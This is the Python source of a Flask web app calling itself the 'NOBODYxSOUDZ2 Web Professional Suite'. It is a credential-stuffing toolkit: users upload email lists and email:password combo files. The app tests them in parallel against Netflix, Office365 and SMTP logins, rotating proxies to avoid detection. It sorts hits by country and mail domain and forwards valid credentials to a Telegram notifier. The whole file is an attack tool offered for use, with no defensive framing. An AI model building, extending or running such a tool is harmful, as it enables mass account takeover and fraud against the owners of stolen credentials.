#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
NOBODYxSOUDZ2 WEB PROFESSIONAL SUITE
Netflix | Office365 | SMTP | Proxy Rotation
"""

import os
import uuid
import time
from datetime import datetime
from threading import Thread

from flask import Flask, render_template, request, jsonify, send_file, send_from_directory
from flask_socketio import SocketIO, emit

app = Flask(__name__, template_folder='templates', static_folder='static')
app.config['SECRET_KEY'] = 'nobodyxsoudz2-web-pro-v3'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

UPLOAD_FOLDER = 'uploads'
RESULTS_FOLDER = 'results'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(RESULTS_FOLDER, exist_ok=True)

from checkers import (
    process_office365_check_parallel,
    process_combo_checker_parallel,
    process_country_sort,
    create_country_zip_from_results,
    process_webmail_sort,
    create_domain_zip_file
)

from telegram_notify import TelegramNotifier
from smtp_office365_checker import process_smtp_office365_check_parallel
from proxy_manager import ProxyManager
from netflix_checker import NetflixChecker

telegram = TelegramNotifier()


def emit_client(sid, event, data):
    if sid:
        try:
            socketio.emit(event, data, room=sid)
        except Exception as e:
            print(f"[SocketIO] Emit error: {e}")


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/favicon.ico')
def favicon():
    return send_from_directory('static', 'favicon.ico', mimetype='image/vnd.microsoft.icon')


# ------------------------------------------------------------------
# NETFLIX
# ------------------------------------------------------------------
@app.route('/api/check/netflix', methods=['POST'])
def check_netflix():
    file = request.files.get('file')
    proxy_file = request.files.get('proxy_file')
    sid = request.form.get('sid')
    if not file or file.filename == '':
        return jsonify({'status': 'error', 'msg': 'No file'}), 400
    uid = str(uuid.uuid4())
    fpath = os.path.join(UPLOAD_FOLDER, f"{uid}_{file.filename}")
    file.save(fpath)
    proxy_path = None
    proxies = []
    if proxy_file and proxy_file.filename:
        proxy_path = os.path.join(UPLOAD_FOLDER, f"{uid}_proxies.txt")
        proxy_file.save(proxy_path)
        with open(proxy_path, 'r', encoding='utf-8', errors='ignore') as f:
            proxies = [l.strip() for l in f if l.strip() and not l.startswith('#')]

    def run():
        try:
            with open(fpath, 'r', encoding='utf-8', errors='ignore') as fh:
                lines = [l.strip() for l in fh if l.strip() and '@' in l]
            total = len(lines)
            if total == 0:
                emit_client(sid, 'job_error', {'tool': 'Netflix', 'msg': 'No valid emails'})
                return
            emit_client(sid, 'job_start', {
                'tool': 'Netflix Checker',
                'total': total,
                'ts': time.time(),
                'proxies': len(proxies)
            })

            def progress(done, total, valid, invalid, errors):
                emit_client(sid, 'job_progress', {
                    'tool': 'Netflix',
                    'done': done,
                    'total': total,
                    'valid': valid,
                    'invalid': invalid,
                    'errors': errors,
                    'percent': round((done / total) * 100, 1)
                })

            proxy_manager = ProxyManager(proxies) if proxies else None
            checker = NetflixChecker(proxy_manager=proxy_manager, max_workers=40)
            valids, invalids, errors = checker.check_batch(lines, progress)

            result_file = None
            if valids:
                fname = f"netflix_valid_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                rpath = os.path.join(RESULTS_FOLDER, fname)
                with open(rpath, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(valids))
                result_file = fname
                telegram.send_valids('Netflix', valids, total)

            emit_client(sid, 'job_done', {
                'tool': 'Netflix',
                'total': total,
                'valid_count': len(valids),
                'invalid': len(invalids),
                'errors': errors,
                'file': result_file
            })
        except Exception as e:
            emit_client(sid, 'job_error', {'tool': 'Netflix', 'msg': str(e)})
        finally:
            if os.path.exists(fpath):
                os.remove(fpath)
            if proxy_path and os.path.exists(proxy_path):
                os.remove(proxy_path)

    Thread(target=run, daemon=True).start()
    return jsonify({'status': 'started', 'tool': 'Netflix'})


# ------------------------------------------------------------------
# OFFICE365 MX
# ------------------------------------------------------------------
@app.route('/api/check/office365', methods=['POST'])
def check_office365():
    file = request.files.get('file')
    sid = request.form.get('sid')
    if not file or file.filename == '':
        return jsonify({'status': 'error', 'msg': 'No file'}), 400
    uid = str(uuid.uuid4())
    fpath = os.path.join(UPLOAD_FOLDER, f"{uid}_{file.filename}")
    file.save(fpath)

    def run():
        try:
            with open(fpath, 'r', encoding='utf-8', errors='ignore') as fh:
                lines = [l.strip() for l in fh if l.strip() and '@' in l]
            total = len(lines)
            if total == 0:
                emit_client(sid, 'job_error', {'tool': 'Office365 MX', 'msg': 'No valid emails'})
                return
            emit_client(sid, 'job_start', {'tool': 'Office365 MX Checker', 'total': total, 'ts': time.time()})

            def progress(done, total, valid):
                emit_client(sid, 'job_progress', {
                    'tool': 'Office365 MX',
                    'done': done,
                    'total': total,
                    'valid': valid,
                    'percent': round((done / total) * 100, 1)
                })

            valids = process_office365_check_parallel(lines, progress)

            result_file = None
            if valids:
                fname = f"office365_valid_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                rpath = os.path.join(RESULTS_FOLDER, fname)
                with open(rpath, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(valids))
                result_file = fname
                telegram.send_valids('Office365 MX', valids, total)

            emit_client(sid, 'job_done', {
                'tool': 'Office365 MX',
                'total': total,
                'valid_count': len(valids),
                'file': result_file
            })
        except Exception as e:
            emit_client(sid, 'job_error', {'tool': 'Office365 MX', 'msg': str(e)})
        finally:
            if os.path.exists(fpath):
                os.remove(fpath)

    Thread(target=run, daemon=True).start()
    return jsonify({'status': 'started', 'tool': 'Office365 MX'})


# ------------------------------------------------------------------
# COMBO
# ------------------------------------------------------------------
@app.route('/api/check/combo', methods=['POST'])
def check_combo():
    file = request.files.get('file')
    sid = request.form.get('sid')
    if not file or file.filename == '':
        return jsonify({'status': 'error', 'msg': 'No file'}), 400
    uid = str(uuid.uuid4())
    fpath = os.path.join(UPLOAD_FOLDER, f"{uid}_{file.filename}")
    file.save(fpath)

    def run():
        try:
            with open(fpath, 'r', encoding='utf-8', errors='ignore') as fh:
                lines = [l.strip() for l in fh if l.strip() and ':' in l and '@' in l.split(':', 1)[0]]
            total = len(lines)
            if total == 0:
                emit_client(sid, 'job_error', {'tool': 'O365 Combo', 'msg': 'No valid combos'})
                return
            emit_client(sid, 'job_start', {'tool': 'O365 Combo Checker', 'total': total, 'ts': time.time()})

            def progress(done, total, valid, skipped, invalid_count):
                emit_client(sid, 'job_progress', {
                    'tool': 'O365 Combo',
                    'done': done,
                    'total': total,
                    'valid': valid,
                    'skipped': skipped,
                    'invalid': invalid_count,
                    'percent': round((done / total) * 100, 1)
                })

            valids, skipped, invalid = process_combo_checker_parallel(lines, progress)

            result_file = None
            if valids:
                fname = f"combo_valid_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                rpath = os.path.join(RESULTS_FOLDER, fname)
                with open(rpath, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(valids))
                result_file = fname
                telegram.send_valids('O365 Combo', valids, total)

            emit_client(sid, 'job_done', {
                'tool': 'O365 Combo',
                'total': total,
                'valid_count': len(valids),
                'skipped': skipped,
                'invalid': invalid,
                'file': result_file
            })
        except Exception as e:
            emit_client(sid, 'job_error', {'tool': 'O365 Combo', 'msg': str(e)})
        finally:
            if os.path.exists(fpath):
                os.remove(fpath)

    Thread(target=run, daemon=True).start()
    return jsonify({'status': 'started', 'tool': 'O365 Combo'})


# ------------------------------------------------------------------
# SMTP O365
# ------------------------------------------------------------------
@app.route('/api/check/smtp_o365', methods=['POST'])
def check_smtp_o365():
    file = request.files.get('file')
    sid = request.form.get('sid')
    admin_email = request.form.get('admin_email', '').strip()
    if not file or file.filename == '':
        return jsonify({'status': 'error', 'msg': 'No file'}), 400
    uid = str(uuid.uuid4())
    fpath = os.path.join(UPLOAD_FOLDER, f"{uid}_{file.filename}")
    file.save(fpath)

    def run():
        try:
            with open(fpath, 'r', encoding='utf-8', errors='ignore') as fh:
                lines = [l.strip() for l in fh if l.strip() and ':' in l and '@' in l.split(':', 1)[0]]
            total = len(lines)
            if total == 0:
                emit_client(sid, 'job_error', {'tool': 'SMTP Office365', 'msg': 'No valid combos'})
                return
            emit_client(sid, 'job_start', {'tool': 'SMTP Office365 Checker', 'total': total, 'ts': time.time()})

            def progress(done, total, valid, invalid_count, errors):
                emit_client(sid, 'job_progress', {
                    'tool': 'SMTP Office365',
                    'done': done,
                    'total': total,
                    'valid': valid,
                    'invalid': invalid_count,
                    'errors': errors,
                    'percent': round((done / total) * 100, 1)
                })

            valids, invalid, errors = process_smtp_office365_check_parallel(lines, progress, admin_email=admin_email)

            result_file = None
            if valids:
                fname = f"smtp_o365_valid_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                rpath = os.path.join(RESULTS_FOLDER, fname)
                with open(rpath, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(valids))
                result_file = fname
                telegram.send_valids('SMTP Office365', valids, total)

            emit_client(sid, 'job_done', {
                'tool': 'SMTP Office365',
                'total': total,
                'valid_count': len(valids),
                'invalid': invalid,
                'errors': errors,
                'file': result_file
            })
        except Exception as e:
            emit_client(sid, 'job_error', {'tool': 'SMTP Office365', 'msg': str(e)})
        finally:
            if os.path.exists(fpath):
                os.remove(fpath)

    Thread(target=run, daemon=True).start()
    return jsonify({'status': 'started', 'tool': 'SMTP Office365'})


# ------------------------------------------------------------------
# COUNTRY SORTER
# ------------------------------------------------------------------
@app.route('/api/sort/country', methods=['POST'])
def sort_country():
    file = request.files.get('file')
    sid = request.form.get('sid')
    sort_type = request.form.get('sort_type', 'all')
    target_country = request.form.get('target_country', '').strip()
    if not file or file.filename == '':
        return jsonify({'status': 'error', 'msg': 'No file'}), 400
    uid = str(uuid.uuid4())
    fpath = os.path.join(UPLOAD_FOLDER, f"{uid}_{file.filename}")
    file.save(fpath)

    def run():
        try:
            with open(fpath, 'r', encoding='utf-8', errors='ignore') as fh:
                lines = [l.strip() for l in fh if l.strip()]
            emails = []
            for l in lines:
                if ':' in l and '@' in l.split(':', 1)[0]:
                    emails.append(l.split(':', 1)[0].strip())
                elif '@' in l:
                    emails.append(l)
            total = len(emails)
            if total == 0:
                emit_client(sid, 'job_error', {'tool': 'Country Sorter', 'msg': 'No valid emails'})
                return
            emit_client(sid, 'job_start', {'tool': 'Country Sorter', 'total': total, 'ts': time.time()})

            def progress(done, total, distinct):
                emit_client(sid, 'job_progress', {
                    'tool': 'Country Sorter',
                    'done': done,
                    'total': total,
                    'distinct': distinct,
                    'percent': round((done / total) * 100, 1)
                })

            result_list, country_dict, unknowns = process_country_sort(
                emails,
                sort_type=sort_type,
                target_country=target_country or None,
                progress_callback=progress
            )

            zip_file = None
            if sort_type == 'unique' and result_list:
                fname = f"country_{target_country.replace(' ', '_').lower()}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                rpath = os.path.join(RESULTS_FOLDER, fname)
                with open(rpath, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(result_list))
                zip_file = fname
            elif country_dict:
                email_to_line = {}
                for l in lines:
                    l = l.strip()
                    if not l:
                        continue
                    if ':' in l and '@' in l.split(':', 1)[0]:
                        email_to_line[l.split(':', 1)[0].strip()] = l
                    elif '@' in l:
                        email_to_line[l] = l

                for country, email_list in country_dict.items():
                    real_lines = []
                    for e in email_list:
                        if e in email_to_line:
                            real_lines.append(email_to_line[e])
                        else:
                            real_lines.append(e)
                    country_dict[country] = real_lines

                zip_path = create_country_zip_from_results(country_dict, unknowns)
                new_name = f"countries_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
                new_path = os.path.join(RESULTS_FOLDER, new_name)
                os.rename(zip_path, new_path)
                zip_file = new_name

            emit_client(sid, 'job_done', {
                'tool': 'Country Sorter',
                'total': total,
                'countries': len(country_dict),
                'file': zip_file
            })
        except Exception as e:
            emit_client(sid, 'job_error', {'tool': 'Country Sorter', 'msg': str(e)})
        finally:
            if os.path.exists(fpath):
                os.remove(fpath)

    Thread(target=run, daemon=True).start()
    return jsonify({'status': 'started', 'tool': 'Country Sorter'})


# ------------------------------------------------------------------
# WEBMAIL SORTER
# ------------------------------------------------------------------
@app.route('/api/sort/webmail', methods=['POST'])
def sort_webmail():
    file = request.files.get('file')
    sid = request.form.get('sid')
    sort_type = request.form.get('sort_type', 'all')
    target_domain = request.form.get('target_domain', '').strip()
    if not file or file.filename == '':
        return jsonify({'status': 'error', 'msg': 'No file'}), 400
    uid = str(uuid.uuid4())
    fpath = os.path.join(UPLOAD_FOLDER, f"{uid}_{file.filename}")
    file.save(fpath)

    def run():
        try:
            with open(fpath, 'r', encoding='utf-8', errors='ignore') as fh:
                lines = [l.strip() for l in fh if l.strip()]
            total = len(lines)
            if total == 0:
                emit_client(sid, 'job_error', {'tool': 'Webmail Sorter', 'msg': 'Empty file'})
                return
            emit_client(sid, 'job_start', {'tool': 'Webmail Sorter', 'total': total, 'ts': time.time()})

            def progress(done, total):
                emit_client(sid, 'job_progress', {
                    'tool': 'Webmail Sorter',
                    'done': done,
                    'total': total,
                    'percent': round((done / total) * 100, 1)
                })

            result, domain_dict = process_webmail_sort(
                lines,
                sort_type=sort_type,
                target_domain=target_domain or None,
                progress_callback=progress
            )

            out_file = None
            if sort_type == 'target' and result:
                fname = f"webmail_{target_domain.replace('.', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                rpath = os.path.join(RESULTS_FOLDER, fname)
                with open(rpath, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(result))
                out_file = fname
            elif domain_dict:
                zip_path = create_domain_zip_file(domain_dict)
                fname = f"domains_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
                rpath = os.path.join(RESULTS_FOLDER, fname)
                os.rename(zip_path, rpath)
                out_file = fname

            emit_client(sid, 'job_done', {
                'tool': 'Webmail Sorter',
                'total': total,
                'domains': len(domain_dict),
                'file': out_file
            })
        except Exception as e:
            emit_client(sid, 'job_error', {'tool': 'Webmail Sorter', 'msg': str(e)})
        finally:
            if os.path.exists(fpath):
                os.remove(fpath)

    Thread(target=run, daemon=True).start()
    return jsonify({'status': 'started', 'tool': 'Webmail Sorter'})


# ------------------------------------------------------------------
# DOWNLOAD
# ------------------------------------------------------------------
@app.route('/api/download/<filename>')
def download_file(filename):
    safe_name = os.path.basename(filename)
    path = os.path.join(RESULTS_FOLDER, safe_name)
    if os.path.exists(path):
        return send_file(path, as_attachment=True)
    return jsonify({'status': 'error', 'msg': 'File not found'}), 404


# ------------------------------------------------------------------
# SOCKETIO
# ------------------------------------------------------------------
@socketio.on('connect')
def on_connect():
    emit('server_info', {
        'name': 'NobodyxSoudz2 Web Pro',
        'version': '3.0.0',
        'time': datetime.now().isoformat()
    })


@socketio.on('disconnect')
def on_disconnect():
    pass


# ------------------------------------------------------------------
# MAIN
# ------------------------------------------------------------------
if __name__ == '__main__':
    print("=" * 60)
    print("  NOBODYxSOUDZ2 WEB PROFESSIONAL SUITE")
    print("  Netflix | Office365 | SMTP | Proxy Rotation")
    print("  Running on http://0.0.0.0:5000")
    print("=" * 60)
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)